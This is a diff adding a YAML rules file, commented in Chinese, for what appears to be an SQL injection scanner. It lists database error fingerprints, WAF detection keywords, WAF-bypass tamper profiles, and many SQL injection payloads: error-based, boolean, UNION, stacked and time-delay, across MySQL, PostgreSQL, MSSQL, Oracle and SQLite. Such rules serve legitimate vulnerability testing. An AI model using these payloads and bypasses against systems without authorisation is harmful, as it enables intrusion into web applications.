@@ -1,0 +1,750 @@
+# SQL 注入 YAML 规则。
+#
+# 这个文件只写规则，不写 Python 检测逻辑。
+# sql_scanner.py 负责发包和判断，rules.py 负责读取这里的规则。
+#
+# 当前规则分为：
+# - sql_error_rules：数据库报错指纹
+# - error_payload_suffixes/error_payload_templates：报错型注入
+# - boolean_payload_groups：布尔盲注
+# - inline_query：子查询 marker 检测
+# - union_query：UNION marker 检测
+# - stacked_payload_groups：stacked query 延时检测
+# - time_payload_groups：普通时间盲注
+# - header_*：Header 注入专用规则
+# - waf_detection：WAF 拦截响应特征
+# - tamper_profiles：WAF 场景下的 payload 变形策略
+#
+# 基础 payload 按通用 SQL 注入上下文扩充：
+# 数字型、单/双引号、括号/双括号、无注释闭合、ORDER BY、Cookie、
+# Header、宽字节/字符集、简单关键字/空格过滤、UNION/stacked/time 都在这里覆盖一部分。
+
+time_delay: 4
+
+# WAF 拦截识别。
+#
+# 这里不追求识别具体是哪一种 WAF，只判断“这个 payload 可能被拦了”。
+# 扫描器只有在原始 payload 被拦截时，才会尝试下面的 tamper_profiles。
+waf_detection:
+  status_codes:
+    - 403
+    - 406
+    - 409
+    - 412
+    - 419
+    - 429
+    - 501
+
+  header_keywords:
+    - cloudflare
+    - cf-ray
+    - akamai
+    - incapsula
+    - imperva
+    - sucuri
+    - mod_security
+    - modsecurity
+    - barracuda
+    - waf
+
+  body_keywords:
+    - access denied
+    - request blocked
+    - blocked by
+    - forbidden
+    - not acceptable
+    - security policy
+    - web application firewall
+    - malicious request
+    - suspicious activity
+    - mod_security
+    - modsecurity
+    - waf
+
+# WAF 绕过变形策略。
+#
+# 这些策略不是一开始就全部发送。
+# 只有正常 payload 返回疑似 WAF 拦截时，sql_scanner.py 才会按顺序重试。
+# places 表示这个策略适合哪些参数位置，避免把换行、Tab 这类字符放进 Cookie。
+max_tampered_payloads_per_probe: 16
+
+tamper_profiles:
+  - name: space_comment
+    places: [query, form, json, cookie, header]
+    tampers:
+      - space_to_comment
+
+  - name: mixed_case
+    places: [query, form, json, cookie, header]
+    tampers:
+      - keyword_mixed_case
+
+  - name: mixed_case_space_comment
+    places: [query, form, json, cookie, header]
+    tampers:
+      - keyword_mixed_case
+      - space_to_comment
+
+  - name: mysql_logic_symbol
+    places: [query, form, json, cookie, header]
+    tampers:
+      - logic_operator_symbol
+      - space_to_comment
+
+  - name: equality_greater
+    places: [query, form, json, cookie, header]
+    tampers:
+      - equality_to_greater
+      - space_to_comment
+
+  - name: equality_between
+    places: [query, form, json, cookie, header]
+    tampers:
+      - equality_to_between
+      - space_to_comment
+
+  - name: mysql_hex_string
+    places: [query, form, json, cookie, header]
+    tampers:
+      - string_to_mysql_hex
+      - keyword_mixed_case
+      - space_to_comment
+
+  - name: mysql_char_string
+    places: [query, form, json, cookie, header]
+    tampers:
+      - string_to_mysql_char
+      - keyword_mixed_case
+      - space_to_comment
+
+  - name: mysql_versioned_comment
+    places: [query, form, json, cookie, header]
+    tampers:
+      - keyword_versioned_comment
+
+  - name: keyword_comment
+    places: [query, form, json, cookie, header]
+    tampers:
+      - keyword_comment
+
+  - name: mixed_case_keyword_comment
+    places: [query, form, json, cookie, header]
+    tampers:
+      - keyword_mixed_case
+      - keyword_comment
+
+  - name: encoded_quote_space_comment
+    places: [query, form, json, cookie, header]
+    tampers:
+      - quote_to_urlencode
+      - keyword_mixed_case
+      - space_to_comment
+
+  - name: tab_space
+    places: [query, form, json]
+    tampers:
+      - space_to_tab
+
+  - name: newline_space
+    places: [query, form, json]
+    tampers:
+      - space_to_newline
+
+  - name: encoded_keyword
+    places: [query, form, json, cookie, header]
+    tampers:
+      - keyword_to_urlencode
+
+  - name: plus_space
+    places: [query, form]
+    tampers:
+      - space_to_plus
+
+sql_error_rules:
+  - dbms: mysql
+    patterns:
+      - 'You have an error in your SQL syntax'
+      - 'MySQL server version'
+      - 'Warning:\s*mysql_'
+      - 'Warning:\s*mysqli_'
+      - 'mysql_fetch'
+      - 'mysqli_fetch'
+      - 'MariaDB server version'
+      - 'valid MySQL result'
+      - 'check the manual that corresponds'
+
+  - dbms: postgresql
+    patterns:
+      - 'PostgreSQL.*ERROR'
+      - 'Warning:\s*pg_'
+      - 'pg_query'
+      - 'pg_exec'
+      - 'syntax error at or near'
+      - 'unterminated quoted string at or near'
+      - 'invalid input syntax for type'
+
+  - dbms: mssql
+    patterns:
+      - 'Microsoft SQL Server'
+      - 'SQL Server Native Client'
+      - 'ODBC SQL Server Driver'
+      - 'Unclosed quotation mark'
+      - 'Incorrect syntax near'
+      - 'Procedure or function .* expects parameter'
+
+  - dbms: oracle
+    patterns:
+      - 'ORA-\d{5}'
+      - 'Oracle error'
+      - 'Oracle.*Driver'
+      - 'quoted string not properly terminated'
+      - 'SQL command not properly ended'
+
+  - dbms: sqlite
+    patterns:
+      - 'SQLite/JDBCDriver'
+      - 'SQLite\.Exception'
+      - 'System\.Data\.SQLite\.SQLiteException'
+      - 'sqlite3\.OperationalError'
+      - 'near .*: syntax error'
+
+  - dbms: generic
+    patterns:
+      - 'SQLSTATE'
+      - 'ODBC SQL'
+      - 'JDBC SQL'
+      - 'database error'
+      - 'SQL syntax'
+      - 'syntax error'
+
+error_payload_suffixes:
+  # 每个后缀代表一种闭合方式。已删除 urlencode 后字节等价的重复项：
+  # `--%20` 与 `-- ` 等价、`%23` 与 `#` 等价、`')--%20` 与 `')-- ` 等价等。
+  - "'"
+  - "\""
+  - "`"
+  - ")"
+  - "))"
+  - "')"
+  - "\")"
+  - "`)"
+  - "'))"
+  - "\"))"
+  - "`))"
+  - "'-- "
+  - "'-- -"
+  - "\"-- "
+  - "'#"
+  - "\"#"
+  - "'/*"
+  - "\"/*"
+  - "')-- "
+  - "\")-- "
+  - "'))-- "
+  - "\"))-- "
+  - "')#"
+  - "\")#"
+  - "'))#"
+  - "\"))#"
+  - "%df%27"
+  - "%df%27-- "
+  - " ORDER BY 999-- "
+  - "' ORDER BY 999-- "
+  - "\" ORDER BY 999-- "
+  - "') ORDER BY 999-- "
+  - "\") ORDER BY 999-- "
+
+error_payload_templates:
+  - "{value} AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)"
+  - "{value}' AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
+  - "{value}\" AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
+  - "{value}') AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
+  - "{value}\") AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
+  - "{value}')) AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
+  - "{value}\")) AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
+  - "{value}%df%27 AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1)-- "
+  - "{value} AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))"
+  - "{value}' AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
+  - "{value}\" AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
+  - "{value}') AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
+  - "{value}\") AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
+  - "{value}%df%27 AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e))-- "
+  - "{value} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,'PASS_SCAN_ERR',0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
+  - "{value}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,'PASS_SCAN_ERR',0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "
+  - "{value} AND CAST('PASS_SCAN_ERR' AS SIGNED)"
+  - "{value} AND 1=CONVERT(INT,'PASS_SCAN_ERR')"
+  - "{value}' AND 1=CONVERT(INT,'PASS_SCAN_ERR')-- "
+  - "{value}\" AND 1=CONVERT(INT,'PASS_SCAN_ERR')-- "
+  - "{value} AND 1=CAST('PASS_SCAN_ERR' AS NUMERIC)"
+
+# Header 注入多见于 User-Agent、Referer、X-Forwarded-For 被写入日志表。
+# 这类场景通常在 SQL 字符串、INSERT VALUES 或 UPDATE SET 中，页面也不一定回显查询结果。
+# 所以 Header 规则重点使用“闭合后再补回字符串”的 payload，少用 UNION/inline marker。
+header_error_payload_suffixes:
+  - "'"
+  - "\""
+  - "')"
+  - "\")"
+  - "'))"
+  - "\"))"
+
+header_error_payload_templates:
+  - "{value}' OR UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1) OR 'a'='b"
+  - "{value}' AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1) AND 'a'='a"
+  - "{value}\" OR UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1) OR \"a\"=\"b"
+  - "{value}\" AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1) AND \"a\"=\"a"
+  - "{value}') OR UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1) OR ('a'='b"
+  - "{value}') AND UPDATEXML(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e),1) AND ('a'='a"
+  - "{value}' OR EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e)) OR 'a'='b"
+  - "{value}' AND EXTRACTVALUE(1,CONCAT(0x7e,'PASS_SCAN_ERR',0x7e)) AND 'a'='a"
+  - "{value}' OR 1=CONVERT(INT,'PASS_SCAN_ERR') OR 'a'='b"
+  - "{value}' AND 1=CONVERT(INT,'PASS_SCAN_ERR') AND 'a'='a"
+  - "{value}' OR 1=CAST('PASS_SCAN_ERR' AS INTEGER) OR 'a'='b"
+  - "{value}' AND 1=CAST('PASS_SCAN_ERR' AS INTEGER) AND 'a'='a"
+
+header_boolean_payload_groups:
+  - name: header_single_quote_or
+    true: "{value}' OR 'passscan'='passscan"
+    false: "{value}' OR 'passscan'='nope"
+
+  - name: header_single_quote_and
+    true: "{value}' AND 'passscan'='passscan"
+    false: "{value}' AND 'passscan'='nope"
+
+  - name: header_double_quote_or
+    true: "{value}\" OR \"passscan\"=\"passscan"
+    false: "{value}\" OR \"passscan\"=\"nope"
+
+  - name: header_double_quote_and
+    true: "{value}\" AND \"passscan\"=\"passscan"
+    false: "{value}\" AND \"passscan\"=\"nope"
+
+  - name: header_paren_single_quote_or
+    true: "{value}') OR ('passscan'='passscan"
+    false: "{value}') OR ('passscan'='nope"
+
+  - name: header_paren_single_quote_and
+    true: "{value}') AND ('passscan'='passscan"
+    false: "{value}') AND ('passscan'='nope"
+
+boolean_payload_groups:
+  # 每组只代表一种“闭合上下文 + 真假逻辑”。
+  # 删掉的变体都能由 deep_tamper / WAF 重试等价生成，放在基础集是重复发包：
+  # - --%20 与 `-- ` urlencode 后字节等价；%23 与 `#` 等价。
+  # - /**/ 内联注释 = space_to_comment tamper。
+  # - && / || / %26%26 / %7c%7c = logic_operator_symbol tamper(+ url 编码)。
+  # 保留：数字型、各引号/括号闭合、OR 逻辑、宽字节、ORDER BY 子上下文。
+  - name: number_and
+    true: "{value} AND 7311=7311"
+    false: "{value} AND 7311=7312"
+
+  - name: number_and_comment
+    true: "{value} AND 7311=7311-- "
+    false: "{value} AND 7311=7312-- "
+
+  - name: number_and_hash
+    true: "{value} AND 7311=7311#"
+    false: "{value} AND 7311=7312#"
+
+  - name: number_between
+    true: "{value} AND 7311 BETWEEN 7311 AND 7311"
+    false: "{value} AND 7311 BETWEEN 7312 AND 7313"
+
+  - name: number_like
+    true: "{value} AND 'passscan' LIKE 'pass%'"
+    false: "{value} AND 'passscan' LIKE 'nope%'"
+
+  - name: single_quote_and
+    true: "{value}' AND 'passscan'='passscan"
+    false: "{value}' AND 'passscan'='nope"
+
+  - name: single_quote_and_number_no_comment
+    true: "{value}' AND 7311=7311 AND '1'='1"
+    false: "{value}' AND 7311=7312 AND '1'='1"
+
+  - name: single_quote_comment
+    true: "{value}' AND 7311=7311-- "
+    false: "{value}' AND 7311=7312-- "
+
+  - name: single_quote_hash
+    true: "{value}' AND 7311=7311#"
+    false: "{value}' AND 7311=7312#"
+
+  - name: double_quote_and
+    true: "{value}\" AND \"passscan\"=\"passscan"
+    false: "{value}\" AND \"passscan\"=\"nope"
+
+  - name: double_quote_and_number_no_comment
+    true: "{value}\" AND 7311=7311 AND \"1\"=\"1"
+    false: "{value}\" AND 7311=7312 AND \"1\"=\"1"
+
+  - name: double_quote_comment
+    true: "{value}\" AND 7311=7311-- "
+    false: "{value}\" AND 7311=7312-- "
+
+  - name: paren_single_quote
+    true: "{value}') AND ('passscan'='passscan"
+    false: "{value}') AND ('passscan'='nope"
+
+  - name: paren_single_quote_comment
+    true: "{value}') AND 7311=7311-- "
+    false: "{value}') AND 7311=7312-- "
+
+  - name: paren_double_quote
+    true: "{value}\") AND (\"passscan\"=\"passscan"
+    false: "{value}\") AND (\"passscan\"=\"nope"
+
+  - name: paren_double_quote_comment
+    true: "{value}\") AND 7311=7311-- "
+    false: "{value}\") AND 7311=7312-- "
+
+  - name: paren_number
+    true: "{value}) AND (7311=7311"
+    false: "{value}) AND (7311=7312"
+
+  - name: paren_number_comment
+    true: "{value}) AND 7311=7311-- "
+    false: "{value}) AND 7311=7312-- "
+
+  - name: double_paren_number_comment
+    true: "{value})) AND 7311=7311-- "
+    false: "{value})) AND 7311=7312-- "
+
+  - name: double_paren_single_quote_comment
+    true: "{value}')) AND 7311=7311-- "
+    false: "{value}')) AND 7311=7312-- "
+
+  - name: double_paren_double_quote_comment
+    true: "{value}\")) AND 7311=7311-- "
+    false: "{value}\")) AND 7311=7312-- "
+
+  - name: or_number
+    true: "{value} OR 7311=7311"
+    false: "{value} OR 7311=7312"
+
+  - name: single_quote_or
+    true: "{value}' OR 'passscan'='passscan"
+    false: "{value}' OR 'passscan'='nope"
+
+  - name: wide_byte_single_quote_and
+    true: "{value}%df%27 AND 7311=7311-- "
+    false: "{value}%df%27 AND 7311=7312-- "
+
+  - name: order_by_number_if
+    true: "IF(7311=7311,1,2)"
+    false: "IF(7311=7312,1,2)"
+
+  - name: order_by_single_quote_if
+    true: "{value}' AND IF(7311=7311,1,2)-- "
+    false: "{value}' AND IF(7311=7312,1,2)-- "
+
+inline_query:
+  marker: PSMARKI7311
+  payloads:
+    - name: generic_select_string
+      dbms: generic
+      payload: "(SELECT '{marker}')"
+
+    - name: mysql_concat
+      dbms: mysql
+      payload: "(SELECT CONCAT('{marker}'))"
+
+    - name: postgresql_concat
+      dbms: postgresql
+      payload: "(SELECT '{marker}'||'')"
+
+    - name: mssql_concat
+      dbms: mssql
+      payload: "(SELECT '{marker}'+ '')"
+
+    - name: oracle_dual
+      dbms: oracle
+      payload: "(SELECT '{marker}' FROM DUAL)"
+
+    - name: sqlite_select
+      dbms: sqlite
+      payload: "(SELECT '{marker}')"
+
+union_query:
+  marker: PSMARKU7311
+  # 列数枚举上限。绝大多数真实查询的 SELECT 列数在 6 以内。
+  # 列数越大，payload 组合数按 1+2+...+n 增长，收益却快速下降。
+  max_columns: 6
+  # 每个模板只代表一种“闭合上下文”，覆盖数字/单引号/双引号/括号/双括号/宽字节。
+  # 不再保留 UNION ALL、--%20、%23、/**/、版本注释、混合换行这些变体：
+  # - UNION ALL：marker 是唯一随机串，不会被 UNION 去重，UNION SELECT 已足够。
+  # - --%20 / %23：经 urlencode 后与 `-- ` 到服务端字节等价，属重复。
+  # - /**/、/*!50000*/、UnIoN%0a：由 WAF 重试 / deep_tamper 按需变形生成，基础集不重复放。
+  payload_templates:
+    - name: number_union
+      template: "{value} UNION SELECT {columns}-- "
+
+    - name: single_quote_union
+      template: "{value}' UNION SELECT {columns}-- "
+
+    - name: double_quote_union
+      template: "{value}\" UNION SELECT {columns}-- "
+
+    - name: paren_single_quote_union
+      template: "{value}') UNION SELECT {columns}-- "
+
+    - name: paren_double_quote_union
+      template: "{value}\") UNION SELECT {columns}-- "
+
+    - name: double_paren_single_quote_union
+      template: "{value}')) UNION SELECT {columns}-- "
+
+    - name: double_paren_double_quote_union
+      template: "{value}\")) UNION SELECT {columns}-- "
+
+    - name: wide_byte_single_quote_union
+      template: "{value}%df%27 UNION SELECT {columns}-- "
+
+header_time_payload_groups:
+  - name: header_mysql_single_quote_or_sleep
+    dbms: mysql
+    control: "{value}' OR SLEEP(0) OR 'a'='b"
+    delay: "{value}' OR SLEEP({time_delay}) OR 'a'='b"
+
+  - name: header_mysql_single_quote_and_sleep
+    dbms: mysql
+    control: "{value}' AND SLEEP(0) AND 'a'='a"
+    delay: "{value}' AND SLEEP({time_delay}) AND 'a'='a"
+
+  - name: header_mysql_double_quote_or_sleep
+    dbms: mysql
+    control: "{value}\" OR SLEEP(0) OR \"a\"=\"b"
+    delay: "{value}\" OR SLEEP({time_delay}) OR \"a\"=\"b"
+
+  - name: header_mysql_double_quote_and_sleep
+    dbms: mysql
+    control: "{value}\" AND SLEEP(0) AND \"a\"=\"a"
+    delay: "{value}\" AND SLEEP({time_delay}) AND \"a\"=\"a"
+
+  - name: header_mysql_paren_single_quote_or_sleep
+    dbms: mysql
+    control: "{value}') OR SLEEP(0) OR ('a'='b"
+    delay: "{value}') OR SLEEP({time_delay}) OR ('a'='b"
+
+  - name: header_mysql_paren_single_quote_and_sleep
+    dbms: mysql
+    control: "{value}') AND SLEEP(0) AND ('a'='a"
+    delay: "{value}') AND SLEEP({time_delay}) AND ('a'='a"
+
+  - name: header_mysql_single_quote_if_sleep
+    dbms: mysql
+    control: "{value}' OR IF(7311=7311,SLEEP(0),0) OR 'a'='b"
+    delay: "{value}' OR IF(7311=7311,SLEEP({time_delay}),0) OR 'a'='b"
+
+  - name: header_postgresql_concat_sleep
+    dbms: postgresql
+    control: "{value}'||(SELECT '' FROM pg_sleep(0))||'"
+    delay: "{value}'||(SELECT '' FROM pg_sleep({time_delay}))||'"
+
+  - name: header_postgresql_paren_concat_sleep
+    dbms: postgresql
+    control: "{value}')||(SELECT '' FROM pg_sleep(0))||('"
+    delay: "{value}')||(SELECT '' FROM pg_sleep({time_delay}))||('"
+
+header_stacked_payload_groups:
+  - name: header_mysql_single_quote_stacked_sleep
+    dbms: mysql
+    control: "{value}';SELECT SLEEP(0);-- "
+    delay: "{value}';SELECT SLEEP({time_delay});-- "
+
+  - name: header_postgresql_single_quote_stacked_sleep
+    dbms: postgresql
+    control: "{value}';SELECT pg_sleep(0);-- "
+    delay: "{value}';SELECT pg_sleep({time_delay});-- "
+
+  - name: header_mssql_single_quote_waitfor
+    dbms: mssql
+    control: "{value}';WAITFOR DELAY '0:0:0';-- "
+    delay: "{value}';WAITFOR DELAY '0:0:{time_delay}';-- "
+
+stacked_payload_groups:
+  - name: mysql_stacked_sleep
+    dbms: mysql
+    control: "{value};SELECT SLEEP(0)-- "
+    delay: "{value};SELECT SLEEP({time_delay})-- "
+
+  - name: mysql_single_quote_stacked_sleep
+    dbms: mysql
+    control: "{value}';SELECT SLEEP(0)-- "
+    delay: "{value}';SELECT SLEEP({time_delay})-- "
+
+  - name: mysql_double_quote_stacked_sleep
+    dbms: mysql
+    control: "{value}\";SELECT SLEEP(0)-- "
+    delay: "{value}\";SELECT SLEEP({time_delay})-- "
+
+  - name: mysql_paren_single_quote_stacked_sleep
+    dbms: mysql
+    control: "{value}');SELECT SLEEP(0)-- "
+    delay: "{value}');SELECT SLEEP({time_delay})-- "
+
+  - name: mysql_paren_double_quote_stacked_sleep
+    dbms: mysql
+    control: "{value}\");SELECT SLEEP(0)-- "
+    delay: "{value}\");SELECT SLEEP({time_delay})-- "
+
+  - name: mysql_double_paren_single_quote_stacked_sleep
+    dbms: mysql
+    control: "{value}'));SELECT SLEEP(0)-- "
+    delay: "{value}'));SELECT SLEEP({time_delay})-- "
+
+  - name: mysql_wide_byte_stacked_sleep
+    dbms: mysql
+    control: "{value}%df%27;SELECT SLEEP(0)-- "
+    delay: "{value}%df%27;SELECT SLEEP({time_delay})-- "
+
+  - name: postgresql_stacked_sleep
+    dbms: postgresql
+    control: "{value};SELECT PG_SLEEP(0)-- "
+    delay: "{value};SELECT PG_SLEEP({time_delay})-- "
+
+  - name: postgresql_single_quote_stacked_sleep
+    dbms: postgresql
+    control: "{value}';SELECT PG_SLEEP(0)-- "
+    delay: "{value}';SELECT PG_SLEEP({time_delay})-- "
+
+  - name: mssql_stacked_waitfor
+    dbms: mssql
+    control: "{value};WAITFOR DELAY '0:0:0'-- "
+    delay: "{value};WAITFOR DELAY '0:0:{time_delay}'-- "
+
+  - name: mssql_single_quote_stacked_waitfor
+    dbms: mssql
+    control: "{value}';WAITFOR DELAY '0:0:0'-- "
+    delay: "{value}';WAITFOR DELAY '0:0:{time_delay}'-- "
+
+time_payload_groups:
+  - name: mysql_number_sleep
+    dbms: mysql
+    control: "{value} AND SLEEP(0)"
+    delay: "{value} AND SLEEP({time_delay})"
+
+  - name: mysql_single_quote_sleep
+    dbms: mysql
+    control: "{value}' AND SLEEP(0)-- "
+    delay: "{value}' AND SLEEP({time_delay})-- "
+
+  - name: mysql_single_quote_if_sleep
+    dbms: mysql
+    control: "{value}' AND IF(7311=7311,SLEEP(0),0)-- "
+    delay: "{value}' AND IF(7311=7311,SLEEP({time_delay}),0)-- "
+
+  - name: mysql_single_quote_no_comment_sleep
+    dbms: mysql
+    control: "{value}' AND SLEEP(0) AND '1'='1"
+    delay: "{value}' AND SLEEP({time_delay}) AND '1'='1"
+
+  - name: mysql_single_quote_symbol_sleep
+    dbms: mysql
+    control: "{value}'&&SLEEP(0)&&'1"
+    delay: "{value}'&&SLEEP({time_delay})&&'1"
+
+  - name: mysql_single_quote_url_symbol_sleep
+    dbms: mysql
+    control: "{value}'%26%26SLEEP(0)%26%26'1"
+    delay: "{value}'%26%26SLEEP({time_delay})%26%26'1"
+
+  - name: mysql_double_quote_sleep
+    dbms: mysql
+    control: "{value}\" AND SLEEP(0)-- "
+    delay: "{value}\" AND SLEEP({time_delay})-- "
+
+  - name: mysql_double_quote_no_comment_sleep
+    dbms: mysql
+    control: "{value}\" AND SLEEP(0) AND \"1\"=\"1"
+    delay: "{value}\" AND SLEEP({time_delay}) AND \"1\"=\"1"
+
+  - name: mysql_double_quote_symbol_sleep
+    dbms: mysql
+    control: "{value}\"&&SLEEP(0)&&\"1"
+    delay: "{value}\"&&SLEEP({time_delay})&&\"1"
+
+  - name: mysql_paren_single_quote_sleep
+    dbms: mysql
+    control: "{value}') AND SLEEP(0)-- "
+    delay: "{value}') AND SLEEP({time_delay})-- "
+
+  - name: mysql_paren_single_quote_no_comment_sleep
+    dbms: mysql
+    control: "{value}') AND SLEEP(0) AND ('1'='1"
+    delay: "{value}') AND SLEEP({time_delay}) AND ('1'='1"
+
+  - name: mysql_paren_single_quote_symbol_sleep
+    dbms: mysql
+    control: "{value}')&&SLEEP(0)&&('1"
+    delay: "{value}')&&SLEEP({time_delay})&&('1"
+
+  - name: mysql_paren_double_quote_sleep
+    dbms: mysql
+    control: "{value}\") AND SLEEP(0)-- "
+    delay: "{value}\") AND SLEEP({time_delay})-- "
+
+  - name: mysql_double_paren_single_quote_sleep
+    dbms: mysql
+    control: "{value}')) AND SLEEP(0)-- "
+    delay: "{value}')) AND SLEEP({time_delay})-- "
+
+  - name: mysql_double_paren_double_quote_sleep
+    dbms: mysql
+    control: "{value}\")) AND SLEEP(0)-- "
+    delay: "{value}\")) AND SLEEP({time_delay})-- "
+
+  - name: mysql_wide_byte_sleep
+    dbms: mysql
+    control: "{value}%df%27 AND SLEEP(0)-- "
+    delay: "{value}%df%27 AND SLEEP({time_delay})-- "
+
+  - name: mysql_order_by_number_sleep
+    dbms: mysql
+    control: "IF(7311=7311,SLEEP(0),0)"
+    delay: "IF(7311=7311,SLEEP({time_delay}),0)"
+
+  - name: mysql_order_by_single_quote_sleep
+    dbms: mysql
+    control: "{value}' AND SLEEP(0)-- "
+    delay: "{value}' AND SLEEP({time_delay})-- "
+
+  - name: mysql_comment_sleep
+    dbms: mysql
+    control: "{value}/**/AND/**/SLEEP(0)"
+    delay: "{value}/**/AND/**/SLEEP({time_delay})"
+
+  - name: mysql_benchmark
+    dbms: mysql
+    control: "{value} AND BENCHMARK(1,MD5('PASS_SCAN'))"
+    delay: "{value} AND BENCHMARK(2500000,MD5('PASS_SCAN'))"
+
+  - name: postgres_number_sleep
+    dbms: postgresql
+    control: "{value} AND 1=(SELECT 1 FROM pg_sleep(0))"
+    delay: "{value} AND 1=(SELECT 1 FROM pg_sleep({time_delay}))"
+
+  - name: postgres_single_quote_sleep
+    dbms: postgresql
+    control: "{value}' AND 1=(SELECT 1 FROM pg_sleep(0))-- "
+    delay: "{value}' AND 1=(SELECT 1 FROM pg_sleep({time_delay}))-- "
+
+  - name: mssql_number_waitfor
+    dbms: mssql
+    control: "{value}; WAITFOR DELAY '0:0:0'-- "
+    delay: "{value}; WAITFOR DELAY '0:0:{time_delay}'-- "
+
+  - name: mssql_single_quote_waitfor
+    dbms: mssql
+    control: "{value}'; WAITFOR DELAY '0:0:0'-- "
+    delay: "{value}'; WAITFOR DELAY '0:0:{time_delay}'-- "
+
+  - name: oracle_number_pipe
+    dbms: oracle
+    control: "{value} AND 1=DBMS_PIPE.RECEIVE_MESSAGE('PASS_SCAN',0)"
+    delay: "{value} AND 1=DBMS_PIPE.RECEIVE_MESSAGE('PASS_SCAN',{time_delay})"
+
+  - name: oracle_single_quote_pipe
+    dbms: oracle
+    control: "{value}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('PASS_SCAN',0)-- "
+    delay: "{value}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('PASS_SCAN',{time_delay})-- "
